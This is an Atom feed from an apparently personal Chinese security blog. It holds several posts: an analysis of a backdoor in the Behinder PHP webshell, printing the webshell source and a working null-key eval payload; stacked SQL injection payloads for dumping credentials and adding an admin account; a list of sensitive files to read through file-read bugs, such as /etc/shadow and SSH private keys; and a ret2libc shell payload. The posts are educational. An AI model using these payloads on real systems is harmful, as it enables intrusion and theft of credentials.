@@ -1,0 +1,280 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Now you see me!</title>
+  
+  <subtitle>夫君子之行，静以修身，俭以养德。非淡泊无以明志，非宁静无以致远。</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://leemeanvvi.github.io/"/>
+  <updated>2020-06-10T14:21:52.661Z</updated>
+  <id>http://leemeanvvi.github.io/</id>
+  
+  <author>
+    <name>Kerberos</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>冰蝎php后门分析</title>
+    <link href="http://leemeanvvi.github.io/2020/06/09/%E5%86%B0%E8%9D%8Ephp%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
+    <id>http://leemeanvvi.github.io/2020/06/09/%E5%86%B0%E8%9D%8Ephp%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</id>
+    <published>2020-06-09T15:07:02.000Z</published>
+    <updated>2020-06-10T14:21:52.661Z</updated>
+    
+    <content type="html"><![CDATA[<p>前段时间在群里收到冰蝎php马有后门的消息，跟着调试了一下。</p><a id="more"></a><h3 id="冰蝎php马"><a href="#冰蝎php马" class="headerlink" title="冰蝎php马"></a>冰蝎php马</h3><p>平平无奇的冰蝎php马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">session_start();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#39;pass&#39;]))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $key&#x3D;substr(md5(uniqid(rand())),16);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    $_SESSION[&#39;k&#39;]&#x3D;$key;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    print $key;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">else</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    $key&#x3D;$_SESSION[&#39;k&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">$post&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">if(!extension_loaded(&#39;openssl&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">$t&#x3D;&quot;base64_&quot;.&quot;decode&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">$post&#x3D;$t($post.&quot;&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">for($i&#x3D;0;$i&lt;strlen($post);$i++) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">     $post[$i] &#x3D; $post[$i]^$key[$i+1&amp;15];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">else</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">$post&#x3D;openssl_decrypt($post, &quot;AES128&quot;, $key);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    $arr&#x3D;explode(&#39;|&#39;,$post);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">    $func&#x3D;$arr[0];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    $params&#x3D;$arr[1];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">@new C($params);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>正常连接的时候，客户端会先以GET方式发送<code>pass=随机数</code>给服务端，服务端将随机生成一串16位的字符串，将其作为key，存在session里面，并将key返回给客户端。后续客户端与服务端的通讯便以这串key作为加密解密的密钥。</p><p>而当我们跳过生成密钥这一步，直接与服务端通讯，就会发现后门的后门。</p><h3 id="后门分析"><a href="#后门分析" class="headerlink" title="后门分析"></a>后门分析</h3><p>先看上半部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">0</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">session_start();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $key = substr(md5(uniqid(rand())), <span class="number">16</span>); </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    $_SESSION[<span class="string">'k'</span>] = $key;                    </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">print</span> $key;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;                             <span class="comment">//跳过了上面生成key的过程</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    $key = $_SESSION[<span class="string">'k'</span>];           <span class="comment">//因为跳过了上面生成$_SESSION['k']的过程，所以$key=null</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    $post = file_get_contents(<span class="string">"php://input"</span>); <span class="comment">//从输入中获取$post</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!extension_loaded(<span class="string">'openssl'</span>)) &#123;        <span class="comment">//检测是否载入了openssl模块</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        $t = <span class="string">"base64_"</span> . <span class="string">"decode"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        $post = $t($post . <span class="string">""</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($post); $i++) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            $post[$i] = $post[$i] ^ $key[$i + <span class="number">1</span> &amp; <span class="number">15</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        $post = openssl_decrypt($post, <span class="string">"AES128"</span>, $key);  <span class="comment">//以null为密钥对$post进行AES128解密，生成新的$post</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>所以我们只要以null为密钥对参数进行AES128加密，就可以控制$post的值。下面代码输出了<code>123456</code>经过加密后的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$plain &#x3D; &quot;123456&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$cipher &#x3D; openssl_encrypt($plain,&quot;aes128&quot;, null);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">echo $cipher;</span></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s1.ax1x.com/2020/06/10/t7uWIf.png" alt="encrypt" title="">                </div>                <div class="image-caption">encrypt</div>            </figure><p>将这串加密后的值直接POST给冰蝎php马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s1.ax1x.com/2020/06/10/t7K1TP.md.png" alt="cipher" title="">                </div>                <div class="image-caption">cipher</div>            </figure><p>经过解密后，$post的值确实解密回原来的<code>123456</code>，从而确认了$post可控。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s1.ax1x.com/2020/06/10/t7KNlQ.md.png" alt="decrypt" title="">                </div>                <div class="image-caption">decrypt</div>            </figure><p>再来看下半部分代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$arr &#x3D; explode(&#39;|&#39;, $post);     &#x2F;&#x2F;以&#39;|&#39;为分割线，将$post分割为数组</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$func &#x3D; $arr[0];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$params &#x3D; $arr[1];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">class C</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    public function __construct($p)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        eval($p . &quot;&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">@new C($params);                 &#x2F;&#x2F;将C类实例化，传入$params，并通过魔术方法最后执行eval($params)</span></pre></td></tr></table></figure><p>看到这里就明白了，如果我们控制<code>$post=&quot;|phpinfo();&quot;</code>，$arr将得到<code>$arr[0]=&quot;&quot;，$arr[1]=&quot;phpinfo();&quot;</code>的数组，从而使<code>$params=&quot;phpinfo();&quot;</code>最后实例化时将执行<code>eval(&quot;phpinfo();&quot;)</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s1.ax1x.com/2020/06/10/t71ph6.png" alt="t71ph6.png" title="">                </div>                <div class="image-caption">t71ph6.png</div>            </figure><p>利用上面的代码生成<code>|phpinfo();</code>加密后的值<code>4eNW1rQ1TnE2zNJbafdykw==</code>，将其直接POST给冰蝎php马，即可看到phpinfo页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s1.ax1x.com/2020/06/10/t71GHs.png" alt="t71GHs.png" title="">                </div>                <div class="image-caption">t71GHs.png</div>            </figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;前段时间在群里收到冰蝎php马有后门的消息，跟着调试了一下。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="Webshell" scheme="http://leemeanvvi.github.io/tags/Webshell/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sql注入-堆叠注入</title>
+    <link href="http://leemeanvvi.github.io/2020/01/05/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+    <id>http://leemeanvvi.github.io/2020/01/05/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
+    <published>2020-01-05T07:51:15.000Z</published>
+    <updated>2020-01-05T08:44:02.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>之前在强网杯中遇到堆叠注入，感觉打开了新世界的大门，然而一直没去研究，最近刚好想起来，虽然实战中还没碰到过，但是学习一下嘛，说不定哪天就用上了。</p><a id="more"></a><h4 id="堆叠注入是什么"><a href="#堆叠注入是什么" class="headerlink" title="堆叠注入是什么"></a>堆叠注入是什么</h4><p>在写sql语句时，要用分号作为语句结束的标志。一般情况下，一次性只提交一个sql语句，如<code>show databases;</code>，结果如下<br><img src="https://s2.ax1x.com/2020/01/05/lDVNvR.png" alt="first">  </p><p>但如果在分号后再构造一个sql语句，那么这一次查询就会执行两个sql语句，如<code>show databases;select user();</code>，结果如下<br><img src="https://s2.ax1x.com/2020/01/05/lDVgxA.png" alt="second">    </p><p>而堆叠注入就是在传输参数的时候允许传入分号，并且允许执行以分号相隔的多条sql语句。最简单的用法就是<code>select 1;show tables;</code> 爆出当前库的表名。常见的注入要受原本的sql语句的限制，select就只能select，update就只能update，进行相应的增删改查。但是由于堆叠注入是在原本的sql语句结束后再构造新的sql语句，不受前面的sql语句的限制，威胁更大，不过局限也大。</p><h4 id="堆叠注入的用法"><a href="#堆叠注入的用法" class="headerlink" title="堆叠注入的用法"></a>堆叠注入的用法</h4><ul><li>使用预处理语句执行sql语句<blockquote><p>set @sql = concat(“select * from xxx”);  #存储sql语句<br>prepare sqla from @sql;  #预定义sql语句<br>execute sqla;  #执行sql语句  </p></blockquote></li></ul><p>例如构造payload为<code>1;set @sql = concat(&quot;select user,passwd from user&quot;);prepare sqla from @sql;execute sqla;#</code>就可以在执行完原本的sql语句后再执行查询用户名和密码的sql语句。</p><ul><li>使用预处理语句绕过关键词过滤</li></ul><p>可以使用char函数配合绕过，如select被过滤的时候，select的ascii码分别为115,101,108,101,99,116，就可以用char(115,101,108,101,99,116)表示select，上述的payload就改为<code>1;set @sql = concat(char(115,101,108,101,99,116),&quot; user,passwd from user&quot;);prepare sqla from @sql;execute sqla;#</code></p><ul><li>直接修改数据库</li></ul><p>比如<code>select 1;insert into users(id,username,password) values(88,&#39;test&#39;,&#39;test&#39;)#</code>往后台用户表中添加自己的账号</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;之前在强网杯中遇到堆叠注入，感觉打开了新世界的大门，然而一直没去研究，最近刚好想起来，虽然实战中还没碰到过，但是学习一下嘛，说不定哪天就用上了。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="sql注入" scheme="http://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>任意文件读取读什么</title>
+    <link href="http://leemeanvvi.github.io/2020/01/05/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%AF%BB%E4%BB%80%E4%B9%88/"/>
+    <id>http://leemeanvvi.github.io/2020/01/05/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%AF%BB%E4%BB%80%E4%B9%88/</id>
+    <published>2020-01-05T06:32:28.000Z</published>
+    <updated>2020-01-05T07:43:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>任意文件读取和任意文件下载还算是常见的漏洞，并且很多时候都可以在上面找到突破口。在此做一个汇总。</p><a id="more"></a><h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><blockquote><p>/etc/passwd<br>/etc/shadow<br>/root/.bash_history<br>/root/.ssh/id_rsa #ssh私钥<br>/var/lib/mlocate/mlocate.db #低版本linux，存放各文件路径的文件</p></blockquote><h5 id="各种框架"><a href="#各种框架" class="headerlink" title="各种框架"></a>各种框架</h5><p>dedecms</p><blockquote><p>/webroot/data/common.inc.php #数据库配置文件<br>/webroot/data/config.cache.inc.php #含邮件账号  </p></blockquote><p>thinkphp</p><blockquote><p>/webroot/config/database.php #数据库配置文件</p></blockquote><p>empirecms</p><blockquote><p>/webroot/e/config/config.php #数据库配置文件  </p></blockquote><p>后续遇到后再补充。。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;任意文件读取和任意文件下载还算是常见的漏洞，并且很多时候都可以在上面找到突破口。在此做一个汇总。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="漏洞利用" scheme="http://leemeanvvi.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2019 what have i done</title>
+    <link href="http://leemeanvvi.github.io/2020/01/05/2019-what-have-i-done/"/>
+    <id>http://leemeanvvi.github.io/2020/01/05/2019-what-have-i-done/</id>
+    <published>2020-01-05T05:25:49.000Z</published>
+    <updated>2020-01-05T07:42:24.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>2020年都过了几天了，还是给自己的2019年做个总结吧。</p><a id="more"></a><h4 id="1月-5月"><a href="#1月-5月" class="headerlink" title="1月-5月"></a>1月-5月</h4><p>这段时间非常痛苦，在不想丢掉实习这份收入的情况下，一边实习一边做毕业设计，然后写毕业论文，准备答辩。白天在上班，下班回来没怎么歇息就要着手弄自己拙劣的毕设，赶在ddl前把代码写好，太仓促了，总是在问自己之前的时间用来干嘛了。也还行吧，选题是《基于朴素贝叶斯定理的linux后门检测》（成品比较垃圾，都不好意思放上github，希望自己可以找机会完善）。借这个机会，了解了linux上的常用后门的原理以及检测方法，也在后续的工作中派上用场了，然后就是稍微接触到一些机器学习方面的知识，不至于一无所知（不过也仅限于此了。。）。然后实习上就是挖挖漏洞，写写报告，做做安服，有空就找些漏洞复现一下。</p><h4 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h4><p>5月末的时候，觉得毕业之后还是得找一间大型一点的公司，在小公司比较局限。然后投了bytedance，一面就挂了，知识积累还是8太行，代码能力也很菜。最后去到了integritytech，6月的情况大家懂的。在这期间被派去驻场防守了，本职毕竟是渗透，对攻击payload比较敏感，给客户发现了问题还说得有模有样，带我去排查他们服务器，之前毕设的内容就派上用场了，然后也发现了问题。总之就是得到了客户的认可，感觉自己是有价值的。这期间就相当于在实战应急方面的东西，后门排查，日志分析，攻击溯源，然后在攻防方面也有了一些体会吧。虽然比较苦，9 9 6已经很要命了，而因为某些原因，那段时间可是8 10 7，但是我觉得还是ok的，毕竟我也不是奔着舒适的工作去的，不然我为什么要做乙方呢。</p><h4 id="7月-12月"><a href="#7月-12月" class="headerlink" title="7月-12月"></a>7月-12月</h4><p>6月底领到毕业证，从此已是社会人。回到公司之后就投入到实战当中了。以前getshell后都不敢乱动，现在拿库，维权，内网一条龙，这是在yxzc中最大的收获，感谢d0uchebag，我大哥，说是我安全生涯的领路人也不为过。12月底，想到更高的平台中发展，就投了chaitin。面试的时候感觉是将这一年的收获复述了一遍，看来这一年还是没有白费的。  </p><p>期待2020，in Chaitin。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;2020年都过了几天了，还是给自己的2019年做个总结吧。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="whispers" scheme="http://leemeanvvi.github.io/categories/whispers/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>notes</title>
+    <link href="http://leemeanvvi.github.io/2019/12/20/notes/"/>
+    <id>http://leemeanvvi.github.io/2019/12/20/notes/</id>
+    <published>2019-12-20T03:41:27.000Z</published>
+    <updated>2020-01-08T06:55:40.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="deadbeef的作用"><a href="#deadbeef的作用" class="headerlink" title="deadbeef的作用"></a>deadbeef的作用</h3><h5 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h5><blockquote><pre><code>       +-----------------+       |     retaddr     |       +-----------------+       |     saved ebp   |ebp---&gt;+-----------------+       |     parameter   |       |                 |       |                 |       |                 |       |                 |       |                 |       +-----------------+</code></pre></blockquote><h5 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h5><blockquote><pre><code>       +-----------------+       |    system_addr  |       +-----------------+       |     deadbeef    |ebp---&gt;+-----------------+       |  /bin/sh_addr   |       |                 |       |                 |       |                 |       |                 |       |                 |       +-----------------+</code></pre><p>payload = “A”*n + p32(system) + p32(0xdeadbeef) + p32(str_bin_sh)</p></blockquote><p>deadbeeef的作用就是覆盖saved ebp</p><h3 id="64位ROP"><a href="#64位ROP" class="headerlink" title="64位ROP"></a>64位ROP</h3><p>需要栈对齐，详情后续再补充</p><h3 id="32为ROP"><a href="#32为ROP" class="headerlink" title="32为ROP"></a>32为ROP</h3><p>栈中参数利用完之后，就要将参数从栈中pop掉</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;deadbeef的作用&quot;&gt;&lt;a href=&quot;#deadbeef的作用&quot; class=&quot;headerlink&quot; title=&quot;deadbeef的作用&quot;&gt;&lt;/a&gt;deadbeef的作用&lt;/h3&gt;&lt;h5 id=&quot;调用栈&quot;&gt;&lt;a href=&quot;#调用栈&quot; class=&quot;he
+      
+    
+    </summary>
+    
+    
+      <category term="binary security" scheme="http://leemeanvvi.github.io/categories/binary-security/"/>
+    
+    
+      <category term="pwn" scheme="http://leemeanvvi.github.io/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用supervisor守护frp</title>
+    <link href="http://leemeanvvi.github.io/2019/12/14/%E4%BD%BF%E7%94%A8supervisor%E5%AE%88%E6%8A%A4frp/"/>
+    <id>http://leemeanvvi.github.io/2019/12/14/%E4%BD%BF%E7%94%A8supervisor%E5%AE%88%E6%8A%A4frp/</id>
+    <published>2019-12-14T14:44:10.000Z</published>
+    <updated>2020-01-05T07:43:28.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>渗透的时候或者平常需要用到内网映射的时候常常会用到frp，但是frp有时会断。以前为了解决这个问题还特意写了个脚本来检查frp进程，现在想起来实在是too young。最近刚好接触到守护进程，就拿frp来试试水，然后supervisor是一款常用的守护进程工具，就决定是你了。</p><a id="more"></a><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>我使用的是ubuntu，用apt安装即可</p><p><code>apt-get install supervisor</code></p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>supervisor的配置文件是/etc/supervisor/supervisord.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">; supervisor config file</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">[unix_http_server]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock   ; (the path to the socket file)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">chmod&#x3D;0700                       ; sockef file mode (default 0700)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">[supervisord]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; (main log file;default $CWD&#x2F;supervisord.log)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; (supervisord pidfile;default supervisord.pid)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">childlogdir&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor            ; (&#39;AUTO&#39; child log dir, default $TEMP)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">; the below section must remain in the config file for RPC</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">; (supervisorctl&#x2F;web interface) to work, additional interfaces may be</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">; added by defining them in separate rpcinterface: sections</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">[rpcinterface:supervisor]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">[supervisorctl]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; use a unix:&#x2F;&#x2F; URL  for a unix socket</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">; The [include] section can just contain the &quot;files&quot; setting.  This</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">; setting can list multiple files (separated by whitespace or</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">; newlines).  It can also contain wildcards.  The filenames are</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">; interpreted as relative to this file.  Included files *cannot*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">; include files themselves.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">[include]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">files &#x3D; &#x2F;etc&#x2F;supervisor&#x2F;conf.d&#x2F;*.conf</span></pre></td></tr></table></figure><p>可以看到include了/etc/supervisor/conf.d/目录下面的conf文件。我们要守护的进程配置文件就要添加在该目录。这里我们新建一个frp.conf文件，添加内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 